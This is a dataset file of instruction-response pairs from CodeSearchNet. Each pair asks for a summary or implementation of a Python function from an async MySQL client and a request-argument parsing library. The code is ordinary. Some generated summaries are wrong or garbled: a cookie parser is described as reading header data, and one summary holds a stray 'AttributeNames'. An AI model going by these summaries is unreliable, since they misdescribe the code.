{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\nasync def callproc(self, procname, args=()):\n        conn = self._get_db()\n        if self._echo:\n            logger.info(\"CALL %s\", procname)\n            logger.info(\"%r\", args)\n\n        for index, arg in enumerate(args):\n            q = \"SET @_%s_%d=%s\" % (procname, index, conn.escape(arg))\n            await self._query(q)\n            await self.nextset()\n\n        _args = ','.join('@_%s_%d' % (procname, i) for i in range(len(args)))\n        q = \"CALL %s(%s)\" % (procname, _args)\n        await self._query(q)\n        self._executed = q\n        return args", "response": "Execute a stored procedure procname with args."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef fetchone(self):\n        self._check_executed()\n        fut = self._loop.create_future()\n\n        if self._rows is None or self._rownumber >= len(self._rows):\n            fut.set_result(None)\n            return fut\n        result = self._rows[self._rownumber]\n        self._rownumber += 1\n\n        fut = self._loop.create_future()\n        fut.set_result(result)\n        return fut", "response": "Fetch the next row from the result set."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef fetchmany(self, size=None):\n        self._check_executed()\n        fut = self._loop.create_future()\n        if self._rows is None:\n            fut.set_result([])\n            return fut\n        end = self._rownumber + (size or self._arraysize)\n        result = self._rows[self._rownumber:end]\n        self._rownumber = min(end, len(self._rows))\n\n        fut.set_result(result)\n        return fut", "response": "Returns the next set of rows of a query result returning a list of tuples."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef scroll(self, value, mode='relative'):\n        self._check_executed()\n        if mode == 'relative':\n            r = self._rownumber + value\n        elif mode == 'absolute':\n            r = value\n        else:\n            raise ProgrammingError(\"unknown scroll mode %s\" % mode)\n\n        if not (0 <= r < len(self._rows)):\n            raise IndexError(\"out of range\")\n        self._rownumber = r\n\n        fut = self._loop.create_future()\n        fut.set_result(None)\n        return fut", "response": "Scroll the cursor in the result set to a new position according to mode."}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nread next row from result.", "response": "async def _read_next(self):\n        \"\"\"Read next row \"\"\"\n        row = await self._result._read_rowdata_packet_unbuffered()\n        row = self._conv_row(row)\n        return row"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nfetches next row from the table.", "response": "async def fetchone(self):\n        \"\"\" Fetch next row \"\"\"\n        self._check_executed()\n        row = await self._read_next()\n        if row is None:\n            return\n        self._rownumber += 1\n        return row"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nfetch all rows as per MySQLdb.", "response": "async def fetchall(self):\n        \"\"\"Fetch all, as per MySQLdb. Pretty useless for large queries, as\n        it is buffered.\n        \"\"\"\n        rows = []\n        while True:\n            row = await self.fetchone()\n            if row is None:\n                break\n            rows.append(row)\n        return rows"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nreturn the next set of rows of a query result returning a list of tuples.", "response": "async def fetchmany(self, size=None):\n        \"\"\"Returns the next set of rows of a query result, returning a\n        list of tuples. When no more rows are available, it returns an\n        empty list.\n\n        The number of rows returned can be specified using the size argument,\n        which defaults to one\n\n        :param size: ``int`` number of rows to return\n        :returns: ``list`` of fetched rows\n        \"\"\"\n        self._check_executed()\n        if size is None:\n            size = self._arraysize\n\n        rows = []\n        for i in range(size):\n            row = await self._read_next()\n            if row is None:\n                break\n            rows.append(row)\n            self._rownumber += 1\n        return rows"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\nasync def scroll(self, value, mode='relative'):\n\n        self._check_executed()\n\n        if mode == 'relative':\n            if value < 0:\n                raise NotSupportedError(\"Backwards scrolling not supported \"\n                                        \"by this cursor\")\n\n            for _ in range(value):\n                await self._read_next()\n            self._rownumber += value\n        elif mode == 'absolute':\n            if value < self._rownumber:\n                raise NotSupportedError(\n                    \"Backwards scrolling not supported by this cursor\")\n\n            end = value - self._rownumber\n            for _ in range(end):\n                await self._read_next()\n            self._rownumber = value\n        else:\n            raise ProgrammingError(\"unknown scroll mode %s\" % mode)", "response": "Scroll the cursor in the result set to a new position."}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nconnects to a database and return a connection context manager.", "response": "def connect(host=\"localhost\", user=None, password=\"\",\n            db=None, port=3306, unix_socket=None,\n            charset='', sql_mode=None,\n            read_default_file=None, conv=decoders, use_unicode=None,\n            client_flag=0, cursorclass=Cursor, init_command=None,\n            connect_timeout=None, read_default_group=None,\n            no_delay=None, autocommit=False, echo=False,\n            local_infile=False, loop=None, ssl=None, auth_plugin='',\n            program_name='', server_public_key=None):\n    \"\"\"See connections.Connection.__init__() for information about\n    defaults.\"\"\"\n    coro = _connect(host=host, user=user, password=password, db=db,\n                    port=port, unix_socket=unix_socket, charset=charset,\n                    sql_mode=sql_mode, read_default_file=read_default_file,\n                    conv=conv, use_unicode=use_unicode,\n                    client_flag=client_flag, cursorclass=cursorclass,\n                    init_command=init_command,\n                    connect_timeout=connect_timeout,\n                    read_default_group=read_default_group,\n                    no_delay=no_delay, autocommit=autocommit, echo=echo,\n                    local_infile=local_infile, loop=loop, ssl=ssl,\n                    auth_plugin=auth_plugin, program_name=program_name)\n    return _ConnectionContextManager(coro)"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\nasync def ensure_closed(self):\n        if self._writer is None:\n            # connection has been closed\n            return\n        send_data = struct.pack('<i', 1) + int2byte(COMMAND.COM_QUIT)\n        self._writer.write(send_data)\n        await self._writer.drain()\n        self.close()", "response": "Send quit command and then close socket connection"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nescaping whatever value you pass to it", "response": "def escape(self, obj):\n        \"\"\" Escape whatever value you pass to it\"\"\"\n        if isinstance(obj, str):\n            return \"'\" + self.escape_string(obj) + \"'\"\n        if isinstance(obj, bytes):\n            return escape_bytes_prefixed(obj)\n        return escape_item(obj, self._charset)"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef cursor(self, *cursors):\n        self._ensure_alive()\n        self._last_usage = self._loop.time()\n        try:\n            if cursors and \\\n                    any(not issubclass(cursor, Cursor) for cursor in cursors):\n                raise TypeError('Custom cursor must be subclass of Cursor')\n        except TypeError:\n            raise TypeError('Custom cursor must be subclass of Cursor')\n        if cursors and len(cursors) == 1:\n            cur = cursors[0](self, self._echo)\n        elif cursors:\n            cursor_name = ''.join(map(lambda x: x.__name__, cursors)) \\\n                .replace('Cursor', '') + 'Cursor'\n            cursor_class = type(cursor_name, cursors, {})\n            cur = cursor_class(self, self._echo)\n        else:\n            cur = self.cursorclass(self, self._echo)\n        fut = self._loop.create_future()\n        fut.set_result(cur)\n        return _ContextManager(fut)", "response": "Instantiates and returns a new Cursor instance."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\nasync def ping(self, reconnect=True):\n        if self._writer is None and self._reader is None:\n            if reconnect:\n                await self._connect()\n                reconnect = False\n            else:\n                raise Error(\"Already closed\")\n        try:\n            await self._execute_command(COMMAND.COM_PING, \"\")\n            await self._read_ok_packet()\n        except Exception:\n            if reconnect:\n                await self._connect()\n                await self.ping(False)\n            else:\n                raise", "response": "Check if the server is alive"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef write_packet(self, payload):\n        # Internal note: when you build packet manually and calls\n        # _write_bytes() directly, you should set self._next_seq_id properly.\n        data = pack_int24(len(payload)) + int2byte(self._next_seq_id) + payload\n        self._write_bytes(data)\n        self._next_seq_id = (self._next_seq_id + 1) % 256", "response": "Writes a mysql packet to the network\n       "}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\nasync def _read_packet(self, packet_type=MysqlPacket):\n        buff = b''\n        while True:\n            try:\n                packet_header = await self._read_bytes(4)\n            except asyncio.CancelledError:\n                self._close_on_cancel()\n                raise\n\n            btrl, btrh, packet_number = struct.unpack(\n                '<HBB', packet_header)\n            bytes_to_read = btrl + (btrh << 16)\n\n            # Outbound and inbound packets are numbered sequentialy, so\n            # we increment in both write_packet and read_packet. The count\n            # is reset at new COMMAND PHASE.\n            if packet_number != self._next_seq_id:\n                raise InternalError(\n                    \"Packet sequence number wrong - got %d expected %d\" %\n                    (packet_number, self._next_seq_id))\n            self._next_seq_id = (self._next_seq_id + 1) % 256\n\n            try:\n                recv_data = await self._read_bytes(bytes_to_read)\n            except asyncio.CancelledError:\n                self._close_on_cancel()\n                raise\n\n            buff += recv_data\n            # https://dev.mysql.com/doc/internals/en/sending-more-than-16mbyte.html\n            if bytes_to_read == 0xffffff:\n                continue\n            if bytes_to_read < MAX_PACKET_LEN:\n                break\n\n        packet = packet_type(buff, self._encoding)\n        packet.check_error()\n        return packet", "response": "Read an entire mysql packet in its entirety from the network\n            and return a MysqlPacket type that represents the results."}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nread a rowdata packet for each data row in the result set.", "response": "async def _read_rowdata_packet(self):\n        \"\"\"Read a rowdata packet for each data row in the result set.\"\"\"\n        rows = []\n        while True:\n            packet = await self.connection._read_packet()\n            if self._check_packet_is_eof(packet):\n                # release reference to kill cyclic reference.\n                self.connection = None\n                break\n            rows.append(self._read_row_from_packet(packet))\n\n        self.affected_rows = len(rows)\n        self.rows = tuple(rows)"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nread a column descriptor packet for each column in the result.", "response": "async def _get_descriptions(self):\n        \"\"\"Read a column descriptor packet for each column in the result.\"\"\"\n        self.fields = []\n        self.converters = []\n        use_unicode = self.connection.use_unicode\n        conn_encoding = self.connection.encoding\n        description = []\n        for i in range(self.field_count):\n            field = await self.connection._read_packet(\n                FieldDescriptorPacket)\n            self.fields.append(field)\n            description.append(field.description())\n            field_type = field.type_code\n            if use_unicode:\n                if field_type == FIELD_TYPE.JSON:\n                    # When SELECT from JSON column: charset = binary\n                    # When SELECT CAST(... AS JSON): charset = connection\n                    # encoding\n                    # This behavior is different from TEXT / BLOB.\n                    # We should decode result by connection encoding\n                    # regardless charsetnr.\n                    # See https://github.com/PyMySQL/PyMySQL/issues/488\n                    encoding = conn_encoding  # SELECT CAST(... AS JSON)\n                elif field_type in TEXT_TYPES:\n                    if field.charsetnr == 63:  # binary\n                        # TEXTs with charset=binary means BINARY types.\n                        encoding = None\n                    else:\n                        encoding = conn_encoding\n                else:\n                    # Integers, Dates and Times, and other basic data\n                    # is encoded in ascii\n                    encoding = 'ascii'\n            else:\n                encoding = None\n            converter = self.connection.decoders.get(field_type)\n            if converter is through:\n                converter = None\n            self.converters.append((encoding, converter))\n\n        eof_packet = await self.connection._read_packet()\n        assert eof_packet.is_eof_packet(), 'Protocol error, expecting EOF'\n        self.description = tuple(description)"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nsend data packets from the local file to the server", "response": "async def send_data(self):\n        \"\"\"Send data packets from the local file to the server\"\"\"\n        self.connection._ensure_alive()\n        conn = self.connection\n\n        try:\n            await self._open_file()\n            with self._file_object:\n                chunk_size = MAX_PACKET_LEN\n                while True:\n                    chunk = await self._file_read(chunk_size)\n                    if not chunk:\n                        break\n                    # TODO: consider drain data\n                    conn.write_packet(chunk)\n        except asyncio.CancelledError:\n            self.connection._close_on_cancel()\n            raise\n        finally:\n            # send the empty packet to signify we are done sending data\n            conn.write_packet(b\"\")"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\nasync def close(self):\n        if not self._parent._is_active:\n            return\n        if self._parent is self:\n            await self.rollback()\n        else:\n            self._is_active = False", "response": "Close this transaction.\n\n        If this transaction is the base transaction in a begin/commit\n        nesting, the transaction will rollback().  Otherwise, the\n        method returns.\n\n        This is used to cancel a Transaction without affecting the scope of\n        an enclosing transaction."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\nasync def rollback(self):\n        if not self._parent._is_active:\n            return\n        await self._do_rollback()\n        self._is_active = False", "response": "Roll back this transaction."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\nasync def prepare(self):\n\n        if not self._parent.is_active:\n            raise exc.InvalidRequestError(\"This transaction is inactive\")\n        await self._connection._prepare_twophase_impl(self._xid)\n        self._is_prepared = True", "response": "Prepare this TwoPhaseTransaction.\n\n        After a PREPARE, the transaction can be committed."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef _distill_params(multiparams, params):\n\n    if not multiparams:\n        if params:\n            return [params]\n        else:\n            return []\n    elif len(multiparams) == 1:\n        zero = multiparams[0]\n        if isinstance(zero, (list, tuple)):\n            if not zero or hasattr(zero[0], '__iter__') and \\\n                    not hasattr(zero[0], 'strip'):\n                # execute(stmt, [{}, {}, {}, ...])\n                # execute(stmt, [(), (), (), ...])\n                return zero\n            else:\n                # execute(stmt, (\"value\", \"value\"))\n                return [zero]\n        elif hasattr(zero, 'keys'):\n            # execute(stmt, {\"key\":\"value\"})\n            return [zero]\n        else:\n            # execute(stmt, \"value\")\n            return [[zero]]\n    else:\n        if (hasattr(multiparams[0], '__iter__') and\n                not hasattr(multiparams[0], 'strip')):\n            return multiparams\n        else:\n            return [multiparams]", "response": "Given a list of positional parameters and a list of bind parameter structures return a list of bind parameter structures."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nexecute a SQL query with optional parameters. Returns a ResultProxy instance with the results of the SQL query.", "response": "def execute(self, query, *multiparams, **params):\n        \"\"\"Executes a SQL query with optional parameters.\n\n        query - a SQL query string or any sqlalchemy expression.\n\n        *multiparams/**params - represent bound parameter values to be\n        used in the execution.  Typically, the format is a dictionary\n        passed to *multiparams:\n\n            await conn.execute(\n                table.insert(),\n                {\"id\":1, \"value\":\"v1\"},\n            )\n\n        ...or individual key/values interpreted by **params::\n\n            await conn.execute(\n                table.insert(), id=1, value=\"v1\"\n            )\n\n        In the case that a plain SQL string is passed, a tuple or\n        individual values in \\*multiparams may be passed::\n\n            await conn.execute(\n                \"INSERT INTO table (id, value) VALUES (%d, %s)\",\n                (1, \"v1\")\n            )\n\n            await conn.execute(\n                \"INSERT INTO table (id, value) VALUES (%s, %s)\",\n                1, \"v1\"\n            )\n\n        Returns ResultProxy instance with results of SQL query\n        execution.\n\n        \"\"\"\n        coro = self._execute(query, *multiparams, **params)\n        return _SAConnectionContextManager(coro)"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nexecuting a query and return the result.", "response": "async def _executemany(self, query, dps, cursor):\n        \"\"\"\n        executemany\n        \"\"\"\n        result_map = None\n        if isinstance(query, str):\n            await cursor.executemany(query, dps)\n        elif isinstance(query, DDLElement):\n            raise exc.ArgumentError(\n                    \"Don't mix sqlalchemy DDL clause \"\n                    \"and execution with parameters\"\n                )\n        elif isinstance(query, ClauseElement):\n            compiled = query.compile(dialect=self._dialect)\n            params = []\n            is_update = isinstance(query, UpdateBase)\n            for dp in dps:\n                params.append(\n                    self._base_params(\n                        query,\n                        dp,\n                        compiled,\n                        is_update,\n                    )\n                )\n            await cursor.executemany(str(compiled), params)\n            result_map = compiled._result_columns\n        else:\n            raise exc.ArgumentError(\n                \"sql statement should be str or \"\n                \"SQLAlchemy data \"\n                \"selection/modification clause\"\n            )\n        ret = await create_result_proxy(\n            self,\n            cursor,\n            self._dialect,\n            result_map\n        )\n        self._weak_results.add(ret)\n        return ret"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nexecuting a SQL query and returns a scalar value.", "response": "async def scalar(self, query, *multiparams, **params):\n        \"\"\"Executes a SQL query and returns a scalar value.\"\"\"\n        res = await self.execute(query, *multiparams, **params)\n        return (await res.scalar())"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\nasync def begin_nested(self):\n        if self._transaction is None:\n            self._transaction = RootTransaction(self)\n            await self._begin_impl()\n        else:\n            self._transaction = NestedTransaction(self, self._transaction)\n            self._transaction._savepoint = await self._savepoint_impl()\n        return self._transaction", "response": "Begin a nested transaction and return a transaction handle."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\nasync def begin_twophase(self, xid=None):\n\n        if self._transaction is not None:\n            raise exc.InvalidRequestError(\n                \"Cannot start a two phase transaction when a transaction \"\n                \"is already in progress.\")\n        if xid is None:\n            xid = self._dialect.create_xid()\n        self._transaction = TwoPhaseTransaction(self, xid)\n        await self.execute(\"XA START %s\", xid)\n        return self._transaction", "response": "Begin a two - phase or XA transaction and return a transactionhandle."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\nasync def rollback_prepared(self, xid, *, is_prepared=True):\n        if not is_prepared:\n            await self.execute(\"XA END '%s'\" % xid)\n        await self.execute(\"XA ROLLBACK '%s'\" % xid)", "response": "Rollback prepared twophase transaction."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\nasync def commit_prepared(self, xid, *, is_prepared=True):\n        if not is_prepared:\n            await self.execute(\"XA END '%s'\" % xid)\n        await self.execute(\"XA COMMIT '%s'\" % xid)", "response": "Commit prepared twophase transaction."}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nclose this SAConnection. This results in a release of the underlying database resources, that is, the underlying connection referenced internally. The underlying connection is typically restored back to the connection-holding Pool referenced by the Engine that produced this SAConnection. Any transactional state present on the underlying connection is also unconditionally released via calling Transaction.rollback() method. After .close() is called, the SAConnection is permanently in a closed state, and will allow no further operations.", "response": "async def close(self):\n        \"\"\"Close this SAConnection.\n\n        This results in a release of the underlying database\n        resources, that is, the underlying connection referenced\n        internally. The underlying connection is typically restored\n        back to the connection-holding Pool referenced by the Engine\n        that produced this SAConnection. Any transactional state\n        present on the underlying connection is also unconditionally\n        released via calling Transaction.rollback() method.\n\n        After .close() is called, the SAConnection is permanently in a\n        closed state, and will allow no further operations.\n        \"\"\"\n        if self._connection is None:\n            return\n\n        if self._transaction is not None:\n            await self._transaction.rollback()\n            self._transaction = None\n        # don't close underlying connection, it can be reused by pool\n        # conn.close()\n        self._engine.release(self)\n        self._connection = None\n        self._engine = None"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\nasync def fetchall(self):\n        try:\n            rows = await self._cursor.fetchall()\n        except AttributeError:\n            self._non_result()\n        else:\n            ret = self._process_rows(rows)\n            await self.close()\n            return ret", "response": "Fetch all rows just like DB - API cursor. fetchall."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nfetch one row just like DB - API cursor. fetchone.", "response": "async def fetchone(self):\n        \"\"\"Fetch one row, just like DB-API cursor.fetchone().\n\n        If a row is present, the cursor remains open after this is called.\n        Else the cursor is automatically closed and None is returned.\n        \"\"\"\n        try:\n            row = await self._cursor.fetchone()\n        except AttributeError:\n            self._non_result()\n        else:\n            if row is not None:\n                return self._process_rows([row])[0]\n            else:\n                await self.close()\n                return None"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nfetch many rows just like DB - API AttributeNames cursor. fetchmany ( size = None ).", "response": "async def fetchmany(self, size=None):\n        \"\"\"Fetch many rows, just like DB-API\n        cursor.fetchmany(size=cursor.arraysize).\n\n        If rows are present, the cursor remains open after this is called.\n        Else the cursor is automatically closed and an empty list is returned.\n        \"\"\"\n        try:\n            if size is None:\n                rows = await self._cursor.fetchmany()\n            else:\n                rows = await self._cursor.fetchmany(size)\n        except AttributeError:\n            self._non_result()\n        else:\n            ret = self._process_rows(rows)\n            if len(ret) == 0:\n                await self.close()\n            return ret"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nfetches the first row and then close the result set unconditionally. Returns None if no row is present.", "response": "async def first(self):\n        \"\"\"Fetch the first row and then close the result set unconditionally.\n\n        Returns None if no row is present.\n        \"\"\"\n        if self._metadata is None:\n            self._non_result()\n        try:\n            return (await self.fetchone())\n        finally:\n            await self.close()"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef dict2schema(dct, schema_class=ma.Schema):\n    attrs = dct.copy()\n\n    class Meta(object):\n        if MARSHMALLOW_VERSION_INFO[0] < 3:\n            strict = True\n        else:\n            register = False\n\n    attrs[\"Meta\"] = Meta\n    return type(str(\"\"), (schema_class,), attrs)", "response": "Generate a marshmallow. Schema class given a dictionary of marshmallow. fields. Field."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef is_json(mimetype):\n    if not mimetype:\n        return False\n    if \";\" in mimetype:  # Allow Content-Type header to be passed\n        mimetype = get_mimetype(mimetype)\n    if mimetype == \"application/json\":\n        return True\n    if mimetype.startswith(\"application/\") and mimetype.endswith(\"+json\"):\n        return True\n    return False", "response": "Indicates if this mimetype is JSON or not."}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\ngets a value from a dictionary. Handles MultiDict types when multiple = True.", "response": "def get_value(data, name, field, allow_many_nested=False):\n    \"\"\"Get a value from a dictionary. Handles ``MultiDict`` types when\n    ``multiple=True``. If the value is not found, return `missing`.\n\n    :param object data: Mapping (e.g. `dict`) or list-like instance to\n        pull the value from.\n    :param str name: Name of the key.\n    :param bool multiple: Whether to handle multiple values.\n    :param bool allow_many_nested: Whether to allow a list of nested objects\n        (it is valid only for JSON format, so it is set to True in ``parse_json``\n        methods).\n    \"\"\"\n    missing_value = missing\n    if allow_many_nested and isinstance(field, ma.fields.Nested) and field.many:\n        if is_collection(data):\n            return data\n\n    if not hasattr(data, \"get\"):\n        return missing_value\n\n    multiple = is_multiple(field)\n    val = data.get(name, missing_value)\n    if multiple and val is not missing:\n        if hasattr(data, \"getlist\"):\n            return data.getlist(name)\n        elif hasattr(data, \"getall\"):\n            return data.getall(name)\n        elif isinstance(val, (list, tuple)):\n            return val\n        if val is None:\n            return None\n        else:\n            return [val]\n    return val"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nensuring that the given locations argument is valid.", "response": "def _validated_locations(self, locations):\n        \"\"\"Ensure that the given locations argument is valid.\n\n        :raises: ValueError if a given locations includes an invalid location.\n        \"\"\"\n        # The set difference between the given locations and the available locations\n        # will be the set of invalid locations\n        valid_locations = set(self.__location_map__.keys())\n        given = set(locations)\n        invalid_locations = given - valid_locations\n        if len(invalid_locations):\n            msg = \"Invalid locations arguments: {0}\".format(list(invalid_locations))\n            raise ValueError(msg)\n        return locations"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef parse_arg(self, name, field, req, locations=None):\n        location = field.metadata.get(\"location\")\n        if location:\n            locations_to_check = self._validated_locations([location])\n        else:\n            locations_to_check = self._validated_locations(locations or self.locations)\n\n        for location in locations_to_check:\n            value = self._get_value(name, field, req=req, location=location)\n            # Found the value; validate and return it\n            if value is not missing:\n                return value\n        return missing", "response": "Parse a single argument from a request."}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nparse the request and return a parsed arguments dictionary for the current request.", "response": "def _parse_request(self, schema, req, locations):\n        \"\"\"Return a parsed arguments dictionary for the current request.\"\"\"\n        if schema.many:\n            assert (\n                \"json\" in locations\n            ), \"schema.many=True is only supported for JSON location\"\n            # The ad hoc Nested field is more like a workaround or a helper,\n            # and it servers its purpose fine. However, if somebody has a desire\n            # to re-design the support of bulk-type arguments, go ahead.\n            parsed = self.parse_arg(\n                name=\"json\",\n                field=ma.fields.Nested(schema, many=True),\n                req=req,\n                locations=locations,\n            )\n            if parsed is missing:\n                parsed = []\n        else:\n            argdict = schema.fields\n            parsed = {}\n            for argname, field_obj in iteritems(argdict):\n                if MARSHMALLOW_VERSION_INFO[0] < 3:\n                    parsed_value = self.parse_arg(argname, field_obj, req, locations)\n                    # If load_from is specified on the field, try to parse from that key\n                    if parsed_value is missing and field_obj.load_from:\n                        parsed_value = self.parse_arg(\n                            field_obj.load_from, field_obj, req, locations\n                        )\n                        argname = field_obj.load_from\n                else:\n                    argname = field_obj.data_key or argname\n                    parsed_value = self.parse_arg(argname, field_obj, req, locations)\n                if parsed_value is not missing:\n                    parsed[argname] = parsed_value\n        return parsed"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nreturn a marshmallow. Schema instance for the given argmap and request.", "response": "def _get_schema(self, argmap, req):\n        \"\"\"Return a `marshmallow.Schema` for the given argmap and request.\n\n        :param argmap: Either a `marshmallow.Schema`, `dict`\n            of argname -> `marshmallow.fields.Field` pairs, or a callable that returns\n            a `marshmallow.Schema` instance.\n        :param req: The request object being parsed.\n        :rtype: marshmallow.Schema\n        \"\"\"\n        if isinstance(argmap, ma.Schema):\n            schema = argmap\n        elif isinstance(argmap, type) and issubclass(argmap, ma.Schema):\n            schema = argmap()\n        elif callable(argmap):\n            schema = argmap(req)\n        else:\n            schema = dict2schema(argmap, self.schema_class)()\n        if MARSHMALLOW_VERSION_INFO[0] < 3 and not schema.strict:\n            warnings.warn(\n                \"It is highly recommended that you set strict=True on your schema \"\n                \"so that the parser's error handler will be invoked when expected.\",\n                UserWarning,\n            )\n        return schema"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef use_args(\n        self,\n        argmap,\n        req=None,\n        locations=None,\n        as_kwargs=False,\n        validate=None,\n        error_status_code=None,\n        error_headers=None,\n    ):\n        \"\"\"Decorator that injects parsed arguments into a view function or method.\n\n        Example usage with Flask: ::\n\n            @app.route('/echo', methods=['get', 'post'])\n            @parser.use_args({'name': fields.Str()})\n            def greet(args):\n                return 'Hello ' + args['name']\n\n        :param argmap: Either a `marshmallow.Schema`, a `dict`\n            of argname -> `marshmallow.fields.Field` pairs, or a callable\n            which accepts a request and returns a `marshmallow.Schema`.\n        :param tuple locations: Where on the request to search for values.\n        :param bool as_kwargs: Whether to insert arguments as keyword arguments.\n        :param callable validate: Validation function that receives the dictionary\n            of parsed arguments. If the function returns ``False``, the parser\n            will raise a :exc:`ValidationError`.\n        :param int error_status_code: Status code passed to error handler functions when\n            a `ValidationError` is raised.\n        :param dict error_headers: Headers passed to error handler functions when a\n            a `ValidationError` is raised.\n        \"\"\"\n        locations = locations or self.locations\n        request_obj = req\n        # Optimization: If argmap is passed as a dictionary, we only need\n        # to generate a Schema once\n        if isinstance(argmap, Mapping):\n            argmap = dict2schema(argmap, self.schema_class)()\n\n        def decorator(func):\n            req_ = request_obj\n\n            @functools.wraps(func)\n            def wrapper(*args, **kwargs):\n                req_obj = req_\n\n                if not req_obj:\n                    req_obj = self.get_request_from_view_args(func, args, kwargs)\n                # NOTE: At this point, argmap may be a Schema, or a callable\n                parsed_args = self.parse(\n                    argmap,\n                    req=req_obj,\n                    locations=locations,\n                    validate=validate,\n                    error_status_code=error_status_code,\n                    error_headers=error_headers,\n                )\n                if as_kwargs:\n                    kwargs.update(parsed_args)\n                    return func(*args, **kwargs)\n                else:\n                    # Add parsed_args after other positional arguments\n                    new_args = args + (parsed_args,)\n                    return func(*new_args, **kwargs)\n\n            wrapper.__wrapped__ = func\n            return wrapper\n\n        return decorator", "response": "Decorator that provides a function that will injects parsed arguments into a view function or method."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef handle_error(\n        self, error, req, schema, error_status_code=None, error_headers=None\n    ):\n        \"\"\"Called if an error occurs while parsing args. By default, just logs and\n        raises ``error``.\n        \"\"\"\n        logger.error(error)\n        raise error", "response": "Called if an error occurs while parsing args."}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nreturn the decoded JSON body from the request.", "response": "def parse_json_body(req):\n    \"\"\"Return the decoded JSON body from the request.\"\"\"\n    content_type = req.headers.get(\"Content-Type\")\n    if content_type and core.is_json(content_type):\n        try:\n            return core.parse_json(req.body)\n        except TypeError:\n            pass\n        except json.JSONDecodeError as e:\n            if e.doc == \"\":\n                return core.missing\n            else:\n                raise\n    return {}"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nhandling gets from multidicts made of lists", "response": "def get_value(d, name, field):\n    \"\"\"Handle gets from 'multidicts' made of lists\n\n    It handles cases: ``{\"key\": [value]}`` and ``{\"key\": value}``\n    \"\"\"\n    multiple = core.is_multiple(field)\n    value = d.get(name, core.missing)\n    if value is core.missing:\n        return core.missing\n    if multiple and value is not core.missing:\n        return [\n            decode_argument(v, name) if isinstance(v, basestring) else v for v in value\n        ]\n    ret = value\n    if value and isinstance(value, (list, tuple)):\n        ret = value[0]\n    if isinstance(ret, basestring):\n        return decode_argument(ret, name)\n    else:\n        return ret"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef parse_querystring(self, req, name, field):\n        return get_value(req.query_arguments, name, field)", "response": "Pull a querystring value from the request."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\npulling a form value from the request.", "response": "def parse_form(self, req, name, field):\n        \"\"\"Pull a form value from the request.\"\"\"\n        return get_value(req.body_arguments, name, field)"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef parse_headers(self, req, name, field):\n        return get_value(req.headers, name, field)", "response": "Pull a value from the header data."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef parse_cookies(self, req, name, field):\n        cookie = req.cookies.get(name)\n\n        if cookie is not None:\n            return [cookie.value] if core.is_multiple(field) else cookie.value\n        else:\n            return [] if core.is_multiple(field) else None", "response": "Pull a value from the header data."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\npull a file from the request.", "response": "def parse_files(self, req, name, field):\n        \"\"\"Pull a file from the request.\"\"\"\n        return get_value(req.files, name, field)"}
